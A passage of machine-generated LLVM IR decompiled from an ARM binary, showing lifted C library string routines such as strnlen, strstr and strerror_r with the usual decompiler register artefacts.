  %v0_11994 = load i32, i32* @r1, align 4
  %v1_11994 = add i32 %v0_11994, 1
  store i32 %v1_11994, i32* %r1.global-to-local, align 4
  %v0_11998 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11998, label %dec_label_pc_119d4, label %dec_label_pc_1199c

dec_label_pc_1199c:                               ; preds = %dec_label_pc_11988
  %v1_1199c = add i32 %v0_11994, 2
  %v2_1199c = inttoptr i32 %v1_1199c to i8*
  %v3_1199c = load i8, i8* %v2_1199c, align 1
  %v4_1199c = zext i8 %v3_1199c to i32
  store i32 %v4_1199c, i32* %r3.global-to-local, align 4
  %v2_119a0 = icmp eq i8 %v3_1199c, 0
  store i1 %v2_119a0, i1* %cpsr_z.global-to-local, align 1
  %v3_119a4 = add i32 %v5_11990, 2
  %v4_119a4 = inttoptr i32 %v3_119a4 to i8*
  store i8 %v3_1199c, i8* %v4_119a4, align 1
  %v5_119a4 = load i32, i32* @ip, align 4
  %v6_119a4 = add i32 %v5_119a4, 1
  store i32 %v6_119a4, i32* @ip, align 4
  %v0_119a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_119a8 = add i32 %v0_119a8, 1
  store i32 %v1_119a8, i32* %r1.global-to-local, align 4
  %v0_119ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_119ac, label %dec_label_pc_119d4, label %dec_label_pc_119b0

dec_label_pc_119b0:                               ; preds = %dec_label_pc_1199c
  %v1_119b0 = add i32 %v0_119a8, 2
  %v2_119b0 = inttoptr i32 %v1_119b0 to i8*
  %v3_119b0 = load i8, i8* %v2_119b0, align 1
  %v4_119b0 = zext i8 %v3_119b0 to i32
  store i32 %v4_119b0, i32* %r3.global-to-local, align 4
  %v2_119b4 = icmp eq i8 %v3_119b0, 0
  store i1 %v2_119b4, i1* %cpsr_z.global-to-local, align 1
  %v3_119b8 = add i32 %v5_119a4, 2
  %v4_119b8 = inttoptr i32 %v3_119b8 to i8*
  store i8 %v3_119b0, i8* %v4_119b8, align 1
  %v5_119b8 = load i32, i32* @ip, align 4
  %v6_119b8 = add i32 %v5_119b8, 1
  store i32 %v6_119b8, i32* @ip, align 4
  %v0_119bc = load i32, i32* %r1.global-to-local, align 4
  %v1_119bc = add i32 %v0_119bc, 1
  store i32 %v1_119bc, i32* %r1.global-to-local, align 4
  %v0_119c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_119c0, label %dec_label_pc_119d4, label %dec_label_pc_119c4

dec_label_pc_119c4:                               ; preds = %dec_label_pc_119b0
  %v0_119c4 = load i32, i32* @lr, align 4
  %v1_119c4 = add i32 %v0_119c4, -1
  store i32 %v1_119c4, i32* @lr, align 4
  %v7_119c4 = icmp eq i32 %v0_119c4, 1
  store i1 %v7_119c4, i1* %cpsr_z.global-to-local, align 1
  %v1_119c8 = add i32 %v0_119bc, 2
  store i32 %v1_119c8, i32* @r1, align 4
  br i1 %v7_119c4, label %dec_label_pc_119e8, label %dec_label_pc_11978

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119b0, %dec_label_pc_1199c, %dec_label_pc_11988, %dec_label_pc_11978
  %v1_119d4 = phi i32 [ %v6_119b8, %dec_label_pc_119b0 ], [ %v6_119a4, %dec_label_pc_1199c ], [ %v6_11990, %dec_label_pc_11988 ], [ %v6_11980, %dec_label_pc_11978 ]
  %v2_119d41 = sub i32 %arg1, %v1_119d4
  %v2_119d8 = add i32 %v2_119d41, %arg2
  store i32 %v2_119d8, i32* %r3.global-to-local, align 4
  %v1_119dc = add i32 %v2_119d8, -1
  store i32 %v1_119dc, i32* %r2.global-to-local, align 4
  %v7_119dc = icmp eq i32 %v2_119d8, 1
  store i1 %v7_119dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119dc, label %bb, label %dec_label_pc_11a08

bb:                                               ; preds = %dec_label_pc_119d4
  ret i32 %arg1

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119c4, %entry
  %v2_119f86 = phi i32 [ %v1_1196c, %entry ], [ %v6_119b8, %dec_label_pc_119c4 ]
  %v1_119e8 = urem i32 %arg2, 4
  store i32 %v1_119e8, i32* %r2.global-to-local, align 4
  %v2_119e8 = icmp eq i32 %v1_119e8, 0
  store i1 %v2_119e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_119e8, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_119e8
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_119e8, %._crit_edge
  %v2_119f8 = phi i32 [ %v6_119f8, %._crit_edge ], [ %v2_119f86, %dec_label_pc_119e8 ]
  %v0_119f4 = phi i32 [ %v0_119f4.pre, %._crit_edge ], [ %v1_119e8, %dec_label_pc_119e8 ]
  %v0_119f0 = load i32, i32* @r1, align 4
  %v1_119f0 = inttoptr i32 %v0_119f0 to i8*
  %v2_119f0 = load i8, i8* %v1_119f0, align 1
  %v3_119f0 = zext i8 %v2_119f0 to i32
  store i32 %v3_119f0, i32* %r3.global-to-local, align 4
  %v5_119f0 = add i32 %v0_119f0, 1
  store i32 %v5_119f0, i32* @r1, align 4
  %v1_119f4 = add i32 %v0_119f4, -1
  store i32 %v1_119f4, i32* %r2.global-to-local, align 4
  %v7_119f4 = icmp eq i32 %v0_119f4, 1
  store i1 %v7_119f4, i1* %cpsr_z.global-to-local, align 1
  %v3_119f8 = add i32 %v2_119f8, 1
  %v4_119f8 = inttoptr i32 %v3_119f8 to i8*
  store i8 %v2_119f0, i8* %v4_119f8, align 1
  %v5_119f8 = load i32, i32* @ip, align 4
  %v6_119f8 = add i32 %v5_119f8, 1
  store i32 %v6_119f8, i32* @ip, align 4
  %v0_119fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_119fc, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_11a00 = load i32, i32* %r3.global-to-local, align 4
  %v2_11a00 = icmp eq i32 %v0_11a00, 0
  store i1 %v2_11a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11a00, label %dec_label_pc_11a08, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_119f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_11a08:                               ; preds = %dec_label_pc_119d4, %bb13, %dec_label_pc_11a08
  %v2_11a10 = phi i32 [ %v6_11a10, %dec_label_pc_11a08 ], [ %v1_119d4, %dec_label_pc_119d4 ], [ %v6_119f8, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11a0c = load i32, i32* %r2.global-to-local, align 4
  %v1_11a0c = add i32 %v0_11a0c, -1
  store i32 %v1_11a0c, i32* %r2.global-to-local, align 4
  %v7_11a0c = icmp eq i32 %v0_11a0c, 1
  store i1 %v7_11a0c, i1* %cpsr_z.global-to-local, align 1
  %v3_11a10 = add i32 %v2_11a10, 1
  %v4_11a10 = inttoptr i32 %v3_11a10 to i8*
  store i8 0, i8* %v4_11a10, align 1
  %v5_11a10 = load i32, i32* @ip, align 4
  %v6_11a10 = add i32 %v5_11a10, 1
  store i32 %v6_11a10, i32* @ip, align 4
  %v0_11a14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11a14, label %dec_label_pc_11a18, label %dec_label_pc_11a08

dec_label_pc_11a18:                               ; preds = %dec_label_pc_11a08
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_11a10, { 1, 0 }
  uselistorder i32 %v0_11a0c, { 1, 0 }
  uselistorder i32 %v6_119f8, { 0, 2, 1 }
  uselistorder i32 %v1_119e8, { 2, 1, 0 }
  uselistorder i32 %v2_119d8, { 2, 1, 0 }
  uselistorder i32 %v1_119c8, { 1, 0 }
  uselistorder i32 %v0_119c4, { 1, 0 }
  uselistorder i32 %v6_119b8, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 4, 2, 1, 3, 0, 5 }
  uselistorder label %dec_label_pc_11a08, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11a1c = load i32, i32* @r1, align 4
  %v2_11a1c = icmp eq i32 %v0_11a1c, 0
  br i1 %v2_11a1c, label %bb, label %dec_label_pc_11a4c

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a5c
  %v3_11a34 = icmp uge i32 %v5_11ae8, %v1_11a34
  %v9_11a34 = icmp eq i32 %v5_11ae8, %v1_11a34
  %v2_11a38 = xor i1 %v3_11a34, true
  %v3_11a38 = or i1 %v9_11a34, %v2_11a38
  br i1 %v3_11a38, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_11a34
  %v6_11a38 = sub i32 %v5_11ae8, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11a34, %bb19
  %v5_11a3c = phi i32 [ %v1_11a34, %dec_label_pc_11a34 ], [ %v6_11a38, %bb19 ]
  %v2_11a3c = xor i1 %v9_11a34, true
  %v3_11a3c = and i1 %v3_11a34, %v2_11a3c
  br i1 %v3_11a3c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_11a3c = sub i32 %v5_11a3c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_11a40 = phi i32 [ %v5_11a3c, %bb20 ], [ %v6_11a3c, %bb21 ]
  ret i32 %v8_11a40

dec_label_pc_11a44:                               ; preds = %dec_label_pc_11a90
  br label %dec_label_pc_11ae4

dec_label_pc_11a4c:                               ; preds = %entry
  %v2_11a4c = add i32 %tmp, %v0_11a1c
  %v3_11a4c = icmp ult i32 %v2_11a4c, %tmp
  br i1 %v3_11a4c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_11a4c
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_11a4c, %bb23
  %v5_11ae8 = phi i32 [ %v2_11a4c, %dec_label_pc_11a4c ], [ -1, %bb23 ]
  %v1_11a6c2 = urem i32 %tmp, 4
  %v2_11a6c3 = icmp eq i32 %v1_11a6c2, 0
  br i1 %v2_11a6c3, label %dec_label_pc_11a74, label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %bb24, %dec_label_pc_11a68
  %v1_11a34 = phi i32 [ %v1_11a68, %dec_label_pc_11a68 ], [ %tmp, %bb24 ]
  %v1_11a5c = inttoptr i32 %v1_11a34 to i8*
  %v2_11a5c = load i8, i8* %v1_11a5c, align 1
  %v2_11a60 = icmp eq i8 %v2_11a5c, 0
  br i1 %v2_11a60, label %dec_label_pc_11a34, label %dec_label_pc_11a68

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a5c
  %v1_11a68 = add i32 %v1_11a34, 1
  %v1_11a6c = urem i32 %v1_11a68, 4
  %v2_11a6c = icmp eq i32 %v1_11a6c, 0
  br i1 %v2_11a6c, label %dec_label_pc_11a74, label %dec_label_pc_11a5c

dec_label_pc_11a74:                               ; preds = %dec_label_pc_11a68, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_11a68, %dec_label_pc_11a68 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_11ad432 = icmp ult i32 %storemerge.lcssa, %v5_11ae8
  br i1 %v3_11ad432, label %dec_label_pc_11a7c, label %dec_label_pc_11ae4

dec_label_pc_11a7c:                               ; preds = %dec_label_pc_11ad0, %dec_label_pc_11a74
  %v0_11a4439 = phi i32 [ %v4_11a7c, %dec_label_pc_11ad0 ], [ %storemerge.lcssa, %dec_label_pc_11a74 ]
  %v1_11a7c = inttoptr i32 %v0_11a4439 to i32*
  %v2_11a7c = load i32, i32* %v1_11a7c, align 4
  %v4_11a7c = add i32 %v0_11a4439, 4
  store i32 %v4_11a7c, i32* @lr, align 4
  %v2_11a80 = add i32 %v2_11a7c, -16843009
  %v2_11a84 = and i32 %v2_11a80, -2139062144
  %v2_11a88 = icmp eq i32 %v2_11a84, 0
  br i1 %v2_11a88, label %dec_label_pc_11ad0, label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a7c
  %v2_11a90 = inttoptr i32 %v0_11a4439 to i8*
  %v3_11a90 = load i8, i8* %v2_11a90, align 1
  %v2_11a98 = icmp eq i8 %v3_11a90, 0
  %v1_11a9c = add i32 %v0_11a4439, 1
  br i1 %v2_11a98, label %dec_label_pc_11a44, label %dec_label_pc_11aa4

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a90
  %v2_11aa4 = inttoptr i32 %v1_11a9c to i8*
  %v3_11aa4 = load i8, i8* %v2_11aa4, align 1
  %v2_11aa8 = icmp eq i8 %v3_11aa4, 0
  br i1 %v2_11aa8, label %dec_label_pc_11ae4, label %dec_label_pc_11ab0

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11aa4
  %v1_11ab0 = add i32 %v0_11a4439, 2
  %v2_11ab0 = inttoptr i32 %v1_11ab0 to i8*
  %v3_11ab0 = load i8, i8* %v2_11ab0, align 1
  %v2_11ab4 = icmp eq i8 %v3_11ab0, 0
  br i1 %v2_11ab4, label %dec_label_pc_11ae4, label %dec_label_pc_11ac0

dec_label_pc_11ac0:                               ; preds = %dec_label_pc_11ab0
  %v1_11ac0 = add i32 %v0_11a4439, 3
  %v2_11ac0 = inttoptr i32 %v1_11ac0 to i8*
  %v3_11ac0 = load i8, i8* %v2_11ac0, align 1
  %v2_11ac4 = icmp eq i8 %v3_11ac0, 0
  br i1 %v2_11ac4, label %dec_label_pc_11ae4, label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11ac0, %dec_label_pc_11a7c
  %v3_11ad4 = icmp ult i32 %v4_11a7c, %v5_11ae8
  br i1 %v3_11ad4, label %dec_label_pc_11a7c, label %dec_label_pc_11ae4

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_11ad0, %dec_label_pc_11a74, %dec_label_pc_11aa4, %dec_label_pc_11ab0, %dec_label_pc_11ac0, %dec_label_pc_11a44
  %v1_11ae4 = phi i32 [ %v0_11a4439, %dec_label_pc_11a44 ], [ %storemerge.lcssa, %dec_label_pc_11a74 ], [ %v1_11a9c, %dec_label_pc_11aa4 ], [ %v1_11ab0, %dec_label_pc_11ab0 ], [ %v1_11ac0, %dec_label_pc_11ac0 ], [ %v5_11ae8, %dec_label_pc_11ad0 ]
  %v3_11ae4 = icmp uge i32 %v5_11ae8, %v1_11ae4
  %v9_11ae4 = icmp eq i32 %v5_11ae8, %v1_11ae4
  %v2_11ae8 = xor i1 %v3_11ae4, true
  %v3_11ae8 = or i1 %v9_11ae4, %v2_11ae8
  br i1 %v3_11ae8, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_11ae4
  %v6_11ae8 = sub i32 %v5_11ae8, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_11ae4, %bb25
  %v5_11aec = phi i32 [ %v1_11ae4, %dec_label_pc_11ae4 ], [ %v6_11ae8, %bb25 ]
  %v2_11aec = xor i1 %v9_11ae4, true
  %v3_11aec = and i1 %v3_11ae4, %v2_11aec
  br i1 %v3_11aec, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_11aec = sub i32 %v5_11aec, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_11af0 = phi i32 [ %v5_11aec, %bb26 ], [ %v6_11aec, %bb27 ]
  ret i32 %v8_11af0

; uselistorder directives
  uselistorder i1 %v3_11ae4, { 1, 0 }
  uselistorder i32 %v4_11a7c, { 1, 2, 0 }
  uselistorder i32 %v0_11a4439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11a68, { 1, 0, 2 }
  uselistorder i32 %v1_11a34, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_11ae8, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_11a34, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_11ae4, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_11a5c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v6_11afc = load i32, i32* @r5, align 4
  %v9_11afc = load i32, i32* @r6, align 4
  %v3_11b00 = load i8, i8* %arg2, align 1
  %v2_11b04 = icmp eq i8 %v3_11b00, 0
  br i1 %v2_11b04, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_11b0c = add i32 %arg1, -1
  br label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b1c, %bb50
  %v0_11b10 = phi i32 [ %v1_11b10, %dec_label_pc_11b1c ], [ %v1_11b0c, %bb50 ]
  %v1_11b10 = add i32 %v0_11b10, 1
  %v2_11b10 = inttoptr i32 %v1_11b10 to i8*
  %v3_11b10 = load i8, i8* %v2_11b10, align 1
  %v2_11b14 = icmp eq i8 %v3_11b10, 0
  br i1 %v2_11b14, label %dec_label_pc_11bec, label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11b10
  %v9_11b1c = icmp eq i8 %v3_11b10, %v3_11b00
  br i1 %v9_11b1c, label %dec_label_pc_11b24, label %dec_label_pc_11b10

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11b1c
  %v2_11b24 = add i32 %tmp, 1
  %v3_11b24 = inttoptr i32 %v2_11b24 to i8*
  %v4_11b24 = load i8, i8* %v3_11b24, align 1
  %v2_11b28 = icmp eq i8 %v4_11b24, 0
  br i1 %v2_11b28, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_11b24
  store i32 %v6_11afc, i32* @r5, align 4
  store i32 %v9_11afc, i32* @r6, align 4
  ret i32 %v1_11b10

bb52:                                             ; preds = %dec_label_pc_11b24
  %v1_11b34 = add i32 %v0_11b10, 2
  %v1_11b88 = add i32 %tmp, 2
  %v2_11b88 = inttoptr i32 %v1_11b88 to i8*
  br label %dec_label_pc_11b80

dec_label_pc_11b44:                               ; preds = %dec_label_pc_11be0
  %v3_11b44 = load i8, i8* %v3_11b78.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_11b70.preheader

dec_label_pc_11b70.preheader:                     ; preds = %dec_label_pc_11b44, %dec_label_pc_11b80
  %v0_11b704.in = phi i8 [ %v3_11b44, %dec_label_pc_11b44 ], [ %v3_11b78.pn, %dec_label_pc_11b80 ]
  %v9_11b7013 = icmp eq i8 %v0_11b704.in, %v3_11b00
  br i1 %v9_11b7013, label %dec_label_pc_11b78, label %dec_label_pc_11b50

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b70.preheader, %dec_label_pc_11b6c
  %v0_11b58 = phi i32 [ %v1_11b6c, %dec_label_pc_11b6c ], [ %storemerge43, %dec_label_pc_11b70.preheader ]
  %v0_11b50.in = phi i8 [ %v3_11b6c, %dec_label_pc_11b6c ], [ %v0_11b704.in, %dec_label_pc_11b70.preheader ]
  %v2_11b50 = icmp eq i8 %v0_11b50.in, 0
  br i1 %v2_11b50, label %dec_label_pc_11bec, label %dec_label_pc_11b58

dec_label_pc_11b58:                               ; preds = %dec_label_pc_11b50
  %v1_11b58 = add i32 %v0_11b58, 1
  %v2_11b58 = inttoptr i32 %v1_11b58 to i8*
  %v3_11b58 = load i8, i8* %v2_11b58, align 1
  store i32 %v1_11b58, i32* @ip, align 4
  %v9_11b5c = icmp eq i8 %v3_11b58, %v3_11b00
  br i1 %v9_11b5c, label %dec_label_pc_11b78, label %dec_label_pc_11b64

dec_label_pc_11b64:                               ; preds = %dec_label_pc_11b58
  %v2_11b64 = icmp eq i8 %v3_11b58, 0
  br i1 %v2_11b64, label %dec_label_pc_11bec, label %dec_label_pc_11b6c

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b64
  %v1_11b6c = add i32 %v0_11b58, 2
  %v2_11b6c = inttoptr i32 %v1_11b6c to i8*
  %v3_11b6c = load i8, i8* %v2_11b6c, align 1
  store i32 %v1_11b6c, i32* @ip, align 4
  %v9_11b70 = icmp eq i8 %v3_11b6c, %v3_11b00
  br i1 %v9_11b70, label %dec_label_pc_11b78, label %dec_label_pc_11b50

dec_label_pc_11b78:                               ; preds = %dec_label_pc_11b58, %dec_label_pc_11b6c, %dec_label_pc_11b70.preheader
  %v0_11b78 = phi i32 [ %storemerge43, %dec_label_pc_11b70.preheader ], [ %v1_11b58, %dec_label_pc_11b58 ], [ %v1_11b6c, %dec_label_pc_11b6c ]
  %v1_11b78 = add i32 %v0_11b78, 1
  br label %dec_label_pc_11b80

dec_label_pc_11b80:                               ; preds = %bb52, %dec_label_pc_11b78
  %storemerge43 = phi i32 [ %v1_11b78, %dec_label_pc_11b78 ], [ %v1_11b34, %bb52 ]
  %v3_11b78.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_11b78.pn = load i8, i8* %v3_11b78.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_11b78.pn, %v4_11b24
  br i1 %storemerge, label %dec_label_pc_11b84, label %dec_label_pc_11b70.preheader

dec_label_pc_11b84:                               ; preds = %dec_label_pc_11b80
  %v1_11b84 = add i32 %storemerge43, 1
  %v2_11b84 = inttoptr i32 %v1_11b84 to i8*
  %v3_11b84 = load i8, i8* %v2_11b84, align 1
  %v4_11b84 = zext i8 %v3_11b84 to i32
  %v3_11b88 = load i8, i8* %v2_11b88, align 1
  %v4_11b88 = zext i8 %v3_11b88 to i32
  %v1_11b8c = add i32 %storemerge43, -1
  %v9_11b90 = icmp eq i8 %v3_11b84, %v3_11b88
  store i32 %v1_11b88, i32* @lr, align 4
  store i32 %v1_11b84, i32* @ip, align 4
  br i1 %v9_11b90, label %dec_label_pc_11ba0, label %dec_label_pc_11be0

dec_label_pc_11ba0:                               ; preds = %dec_label_pc_11b84, %dec_label_pc_11b9c
  %v0_11bb8 = phi i32 [ %v1_11bc0, %dec_label_pc_11b9c ], [ %v1_11b88, %dec_label_pc_11b84 ]
  %v0_11bb0 = phi i32 [ %v1_11bbc, %dec_label_pc_11b9c ], [ %v1_11b84, %dec_label_pc_11b84 ]
  %v0_11ba0 = phi i32 [ %v4_11bd0, %dec_label_pc_11b9c ], [ %v4_11b84, %dec_label_pc_11b84 ]
  %v2_11ba0 = icmp eq i32 %v0_11ba0, 0
  br i1 %v2_11ba0, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_11ba0
  store i32 %v6_11afc, i32* @r5, align 4
  store i32 %v9_11afc, i32* @r6, align 4
  ret i32 %v1_11b8c

bb54:                                             ; preds = %dec_label_pc_11ba0
  %v1_11ba8 = add i32 %v0_11bb0, 1
  %v2_11ba8 = inttoptr i32 %v1_11ba8 to i8*
  %v3_11ba8 = load i8, i8* %v2_11ba8, align 1
  %v1_11bac = add i32 %v0_11bb8, 1
  %v2_11bac = inttoptr i32 %v1_11bac to i8*
  %v3_11bac = load i8, i8* %v2_11bac, align 1
  %v4_11bac = zext i8 %v3_11bac to i32
  store i32 %v1_11ba8, i32* @r1, align 4
  %v9_11bb4 = icmp eq i8 %v3_11ba8, %v3_11bac
  %v1_11bbc = add i32 %v0_11bb0, 2
  store i32 %v1_11bbc, i32* @ip, align 4
  %v1_11bc0 = add i32 %v0_11bb8, 2
  store i32 %v1_11bc0, i32* @lr, align 4
  br i1 %v9_11bb4, label %dec_label_pc_11bc8, label %dec_label_pc_11be0

dec_label_pc_11bc8:                               ; preds = %bb54
  %v2_11bc8 = icmp eq i8 %v3_11ba8, 0
  br i1 %v2_11bc8, label %bb55, label %dec_label_pc_11b9c

bb55:                                             ; preds = %dec_label_pc_11bc8
  store i32 %v6_11afc, i32* @r5, align 4
  store i32 %v9_11afc, i32* @r6, align 4
  ret i32 %v1_11b8c

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11bc8
  %v2_11bd0 = inttoptr i32 %v1_11bc0 to i8*
  %v3_11bd0 = load i8, i8* %v2_11bd0, align 1
  %v4_11bd0 = zext i8 %v3_11bd0 to i32
  %v2_11bd4 = inttoptr i32 %v1_11bbc to i8*
  %v3_11bd4 = load i8, i8* %v2_11bd4, align 1
  %v9_11bd8 = icmp eq i8 %v3_11bd4, %v3_11bd0
  br i1 %v9_11bd8, label %dec_label_pc_11ba0, label %dec_label_pc_11be0

dec_label_pc_11be0:                               ; preds = %dec_label_pc_11b9c, %bb54, %dec_label_pc_11b84
  %v0_11be0 = phi i32 [ %v4_11b88, %dec_label_pc_11b84 ], [ %v4_11bd0, %dec_label_pc_11b9c ], [ %v4_11bac, %bb54 ]
  %v2_11be0 = icmp eq i32 %v0_11be0, 0
  br i1 %v2_11be0, label %dec_label_pc_11be8, label %dec_label_pc_11b44

dec_label_pc_11be8:                               ; preds = %dec_label_pc_11be0
  store i32 %v6_11afc, i32* @r5, align 4
  store i32 %v9_11afc, i32* @r6, align 4
  ret i32 %v1_11b8c

dec_label_pc_11bec:                               ; preds = %dec_label_pc_11b10, %dec_label_pc_11b64, %dec_label_pc_11b50
  store i32 %v6_11afc, i32* @r5, align 4
  store i32 %v9_11afc, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11bc0, { 0, 2, 1 }
  uselistorder i32 %v1_11bbc, { 1, 2, 0 }
  uselistorder i32 %v1_11b8c, { 2, 1, 0 }
  uselistorder i8 %v3_11b78.pn, { 1, 0 }
  uselistorder i8* %v3_11b78.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_11b6c, { 1, 0 }
  uselistorder i32 %v1_11b6c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11b10, { 0, 2, 1 }
  uselistorder i8 %v3_11b00, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_11afc, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_11afc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11bec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11ba0, { 1, 0 }
  uselistorder label %dec_label_pc_11b80, { 1, 0 }
  uselistorder label %dec_label_pc_11b78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b50, { 1, 0 }
  uselistorder label %dec_label_pc_11b70.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11bfc = call i32 @__xpg_strerror_r()
  %v0_11c00 = load i32, i32* @r4, align 4
  ret i32 %v0_11c00
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_11c08 = load i32, i32* @r4, align 4
  %v0_11c0c = load i32, i32* @r0, align 4
  %v0_11c18 = load i32, i32* @r1, align 4
  store i32 %v0_11c18, i32* @r8, align 4
  %v0_11c1c = load i32, i32* @r2, align 4
  store i32 %v0_11c1c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_11c0c, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_11c54

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1a0fc.698 to i32), i32* @r5, align 4
  %v2_11c3c3446 = icmp eq i32 %v0_11c0c, 0
  br i1 %v2_11c3c3446, label %bb26, label %dec_label_pc_11c30.lr.ph

dec_label_pc_11c30:                               ; preds = %dec_label_pc_11c30.lr.ph, %bb
  %v2_11c4841 = phi i1 [ %v2_11c483849, %dec_label_pc_11c30.lr.ph ], [ %v2_11c48, %bb ]
  %v1_11c4c40 = phi i32 [ %v0_11c3c.pr48, %dec_label_pc_11c30.lr.ph ], [ %v2_11c38, %bb ]
  %v0_11c3439 = phi i32 [ %v0_11c40547, %dec_label_pc_11c30.lr.ph ], [ %v1_11c34, %bb ]
  %v1_11c34 = add i32 %v0_11c3439, 1
  store i32 %v1_11c34, i32* @r5, align 4
  br i1 %v2_11c4841, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_11c30
  %v2_11c38 = add i32 %v1_11c4c40, -1
  %v2_11c3c = icmp eq i32 %v2_11c38, 0
  %v1_11c40 = inttoptr i32 %v1_11c34 to i8*
  %v2_11c40 = load i8, i8* %v1_11c40, align 1
  %v2_11c48 = icmp eq i8 %v2_11c40, 0
  br i1 %v2_11c3c, label %dec_label_pc_11c48, label %dec_label_pc_11c30

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_11c30
  %v1_11c4035 = inttoptr i32 %v1_11c34 to i8*
  %v2_11c4036 = load i8, i8* %v1_11c4035, align 1
  %v2_11c4838 = icmp eq i8 %v2_11c4036, 0
  br label %dec_label_pc_11c30.lr.ph

dec_label_pc_11c30.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
